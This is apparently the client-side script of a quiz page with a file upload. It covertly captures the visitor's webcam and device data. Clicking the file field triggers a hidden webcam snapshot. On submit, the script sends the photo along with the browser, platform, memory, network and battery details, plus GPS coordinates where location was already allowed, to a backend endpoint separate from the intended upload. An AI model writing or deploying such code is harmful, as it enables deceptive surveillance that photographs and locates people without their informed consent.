const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";

const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let capturedImage = null; // ✅ store image, don't send yet

// ================================
// COLLECT METADATA (SUBMIT ONLY)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory
      ? navigator.deviceMemory + " GB"
      : "N/A",
    network: navigator.connection
      ? JSON.stringify(navigator.connection)
      : "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery (no popup)
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location ONLY if already allowed
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({
        name: "geolocation",
      });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAMERA CAPTURE (FILE CLICK ONLY)
// ================================
async function captureCamera() {
  if (cameraCaptured) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    await new Promise((r) => setTimeout(r, 1500));

    canvas.width = 640;
    canvas.height = 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png"); // ✅ store only

    stream.getTracks().forEach((t) => t.stop());
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera denied:", err);
  }
}

// ask permission ONLY when clicking file
if (fileInput) {
  fileInput.addEventListener("click", async () => {
    await captureCamera();
  });
}

// ================================
// FILE UPLOAD
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM (SEND EVERYTHING)
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please upload a file first");
    return;
  }

  try {
    // 1️⃣ collect metadata NOW
    const metadata = await collectMetadata();

    // 2️⃣ send image + metadata together
    if (capturedImage) {
      await fetch(`${BACKEND_BASE}/upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image: capturedImage,
          metadata,
        }),
      });
    }

    // 3️⃣ upload file
    await uploadFile(fileInput.files[0]);

    // 4️⃣ show success
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error("Submit failed:", err);
    alert("Submission failed. Try again.");
  }
});
